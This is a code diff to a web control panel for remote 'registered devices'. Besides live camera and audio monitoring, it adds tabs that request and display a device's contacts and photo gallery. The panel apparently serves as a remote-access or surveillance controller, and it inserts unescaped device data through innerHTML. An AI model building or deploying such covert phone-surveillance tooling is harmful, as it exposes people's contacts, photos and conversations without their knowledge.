@@ -211,9 +211,95 @@
             flex: 1;
             margin: 0 5px;
         }
+
+        /* Tabs & New Views */
+        .nav-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            background: #2a2a2a;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .nav-btn {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 15px;
+            border-radius: 0;
+            color: #888;
+        }
+        .nav-btn.active {
+            background: var(--primary-color);
+            color: white;
+        }
+        .nav-btn:hover:not(.active) {
+            background: #333;
+            color: white;
+        }
+        
+        .contact-item {
+            padding: 10px;
+            border-bottom: 1px solid #333;
+        }
+        .contact-name { font-weight: bold; }
+        .contact-number { color: #aaa; font-size: 0.9em; }
+
+        .gallery-item {
+            background: #2a2a2a;
+            border-radius: 4px;
+            overflow: hidden;
+            cursor: pointer;
+            text-align: center;
+            padding: 5px;
+        }
+        .gallery-thumb {
+            width: 100%;
+            height: 100px;
+            object-fit: cover;
+            background: #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
+        }
+        .gallery-name {
+            font-size: 0.8em;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            padding: 4px;
+        }
+        
+        /* Modal for Image Viewing */
+        #imageModal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #fullImage {
+            max-width: 90%;
+            max-height: 80%;
+            border: 2px solid white;
+        }
+        #closeModal {
+            margin-top: 20px;
+            background: var(--error-color);
+            width: auto;
+            padding: 10px 20px;
+        }
     </style>
 </head>
 <body>
+
+<div id="imageModal">
+    <img id="fullImage" src="">
+    <button id="closeModal" onclick="closeModal()">Close</button>
+</div>
 
 <div class="container">
     <header>
@@ -235,7 +321,52 @@
             </div>
         </div>
 
-        <div class="section">
+        <div id="controls" class="controls">
+            <div class="nav-tabs">
+                <button class="nav-btn active" onclick="switchTab('monitor')" id="tab-monitor"><i class="fas fa-video"></i> Monitor</button>
+                <button class="nav-btn" onclick="switchTab('contacts')" id="tab-contacts"><i class="fas fa-address-book"></i> Contacts</button>
+                <button class="nav-btn" onclick="switchTab('gallery')" id="tab-gallery"><i class="fas fa-images"></i> Gallery</button>
+            </div>
+
+            <div id="monitorView">
+                 <h2><i class="fas fa-gamepad"></i> Controls</h2>
+                 <div class="control-row">
+                     <button id="btnStartMonitor" onclick="startMonitoring()"><i class="fas fa-play"></i> Start Monitor</button>
+                     <button id="btnStopMonitor" class="disconnect" onclick="stopMonitoring()" style="display: none;"><i class="fas fa-stop"></i> Stop Monitor</button>
+                 </div>
+                 <div class="control-row">
+                     <button onclick="toggleCamera()"><i class="fas fa-sync-alt"></i> Switch Camera</button>
+                     <button id="btnAudio" onclick="toggleAudio()"><i class="fas fa-microphone"></i> Start Audio</button>
+                 </div>
+                 <img id="videoFeed" alt="Video Stream" style="width: 100%; border-radius: 8px; border: 1px solid #3a3a3a; display: none; margin-top: 16px;">
+            </div>
+
+            <div id="contactsView" style="display:none;">
+                <div class="section">
+                    <h2><i class="fas fa-address-book"></i> Contacts <button onclick="loadContacts()" style="float:right; padding: 5px 10px; width:auto;"><i class="fas fa-sync"></i></button></h2>
+                    <div id="contactsList" style="max-height: 400px; overflow-y: auto;">
+                        <p style="text-align:center; color:#666; padding: 20px;">Click refresh to load.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="galleryView" style="display:none;">
+                 <div class="section">
+                    <h2><i class="fas fa-images"></i> Gallery <button onclick="loadGallery()" style="float:right; padding: 5px 10px; width:auto;"><i class="fas fa-sync"></i></button></h2>
+                    <div id="galleryGrid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; max-height: 500px; overflow-y: auto;">
+                        <p style="text-align:center; color:#666; grid-column: 1/-1; padding: 20px;">Click refresh to load.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Moved Status and Device List below controls for better layout or keep them? 
+             Actually, let's keep device list and status VISIBLE always, so user knows what's up.
+             But "controls" div was hidden until connect. 
+             So the tabs will only show when connected. Correct.
+        -->
+
+        <div class="section" style="margin-top: 20px;">
             <h2><i class="fas fa-list"></i> Registered Devices <button id="btnScan" onclick="scanDevices()" style="float: right; padding: 4px 8px; font-size: 0.8em; width: auto;"><i class="fas fa-sync-alt"></i></button></h2>
             <div id="deviceList">
                 <p style="color: #666; font-size: 0.9em; text-align: center;">Loading devices...</p>
@@ -246,20 +377,7 @@
             <h2><i class="fas fa-info-circle"></i> Status</h2>
             <div id="status">Not Connected</div>
         </div>
-        
-        <div id="controls" class="controls">
-             <h2><i class="fas fa-gamepad"></i> Controls</h2>
-             <div class="control-row">
-                 <button id="btnStartMonitor" onclick="startMonitoring()"><i class="fas fa-play"></i> Start Monitor</button>
-                 <button id="btnStopMonitor" class="disconnect" onclick="stopMonitoring()" style="display: none;"><i class="fas fa-stop"></i> Stop Monitor</button>
-             </div>
-             <div class="control-row">
-                 <button onclick="toggleCamera()"><i class="fas fa-sync-alt"></i> Switch Camera</button>
-                 <button id="btnAudio" onclick="toggleAudio()"><i class="fas fa-microphone"></i> Start Audio</button>
-             </div>
-        </div>
 
-        <img id="videoFeed" alt="Video Stream" style="width: 100%; border-radius: 8px; border: 1px solid #3a3a3a; display: none; margin-top: 16px;">
     </main>
 </div>
 
@@ -524,10 +642,94 @@
                     if (msg.message === 'Audio stopped') { isAudioOn = false; updateControlButtons(); }
                 }
             }
+            else if (msg.type === 'contacts_list') {
+                // msg.data is { data: "[...]" }
+                const contacts = JSON.parse(msg.data.data);
+                const list = document.getElementById('contactsList');
+                list.innerHTML = '';
+                if (contacts.length === 0) {
+                     list.innerHTML = '<p style="text-align:center; color:#666; padding: 20px;">No contacts found.</p>';
+                } else {
+                    contacts.forEach(c => {
+                        const div = document.createElement('div');
+                        div.className = 'contact-item';
+                        div.innerHTML = `<div class="contact-name">${c.name}</div><div class="contact-number">${c.phoneNumber}</div>`;
+                        list.appendChild(div);
+                    });
+                }
+                log(`Loaded ${contacts.length} contacts.`);
+            }
+            else if (msg.type === 'gallery_list') {
+                const images = JSON.parse(msg.data.data);
+                const grid = document.getElementById('galleryGrid');
+                grid.innerHTML = '';
+                if (images.length === 0) {
+                     grid.innerHTML = '<p style="text-align:center; color:#666; grid-column: 1/-1; padding: 20px;">No images found.</p>';
+                } else {
+                    images.forEach(img => {
+                        const div = document.createElement('div');
+                        div.className = 'gallery-item';
+                        div.onclick = () => requestImage(img.id);
+                        // Convert timestamp to date string
+                        const dateStr = new Date(img.date * 1000).toLocaleDateString();
+                        div.innerHTML = `
+                            <div class="gallery-thumb" id="thumb-${img.id}"><i class="fas fa-image fa-2x"></i></div>
+                            <div class="gallery-name">${img.name}</div>
+                            <div style="font-size:0.7em; color:#666;">${dateStr}</div>
+                        `;
+                        grid.appendChild(div);
+                    });
+                }
+                log(`Loaded ${images.length} images.`);
+            }
+            else if (msg.type === 'gallery_image') {
+                const id = msg.data.id;
+                const base64 = msg.data.data;
+                const imgSrc = "data:image/jpeg;base64," + base64;
+                
+                // If modal is open, show there
+                const modal = document.getElementById('imageModal');
+                if (modal.style.display === 'flex') {
+                    document.getElementById('fullImage').src = imgSrc;
+                }
+            }
         } catch (e) {
             console.error("Parse Error", e);
         }
     }
+
+    function switchTab(tab) {
+        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById('tab-' + tab).classList.add('active');
+        
+        document.getElementById('monitorView').style.display = 'none';
+        document.getElementById('contactsView').style.display = 'none';
+        document.getElementById('galleryView').style.display = 'none';
+        
+        document.getElementById(tab + 'View').style.display = 'block';
+    }
+
+    function loadContacts() {
+        document.getElementById('contactsList').innerHTML = '<p style="text-align:center; color:#666; padding: 20px;">Loading...</p>';
+        sendCommand('get_contacts');
+    }
+
+    function loadGallery() {
+        document.getElementById('galleryGrid').innerHTML = '<p style="text-align:center; color:#666; grid-column: 1/-1; padding: 20px;">Loading...</p>';
+        sendCommand('get_gallery');
+    }
+
+    function requestImage(id) {
+        document.getElementById('imageModal').style.display = 'flex';
+        document.getElementById('fullImage').src = ''; // Clear previous
+        // Show loading state in modal?
+        sendCommand('get_image', { id: id.toString() });
+    }
+
+    function closeModal() {
+        document.getElementById('imageModal').style.display = 'none';
+    }
+
 
     function handleBinaryData(data) {
         if (data instanceof Blob) {
